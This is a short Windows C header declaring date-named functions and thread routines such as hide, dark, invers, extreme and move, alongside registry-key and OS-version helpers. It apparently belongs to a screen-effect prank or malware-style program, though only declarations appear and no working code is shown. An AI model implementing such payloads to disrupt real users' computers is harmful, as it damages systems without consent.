#pragma once
#include <Windows.h>
#include "NoWayHome.h"
#include "registrykeys.h"
#include <CommCtrl.h>


extern void March13();
extern void march4();
extern void December24();
extern void January9();
extern void January24();
extern DWORD WINAPI hide(LPVOID lpstart);
extern DWORD WINAPI dark(LPVOID lpstart);
extern DWORD WINAPI invers(LPVOID lpstart);
extern DWORD WINAPI onceinabluemooneffect(LPVOID lpstart);
extern DWORD WINAPI effect(LPVOID lpstart);
extern DWORD WINAPI Amazing(LPVOID lpstart);
extern DWORD WINAPI colours(LPVOID lpstart);
extern DWORD WINAPI extreme(LPVOID lpstart);
extern DWORD WINAPI move(LPVOID lpstart);
extern BOOL GetOsVersion();
#pragma comment (lib, "Version.lib")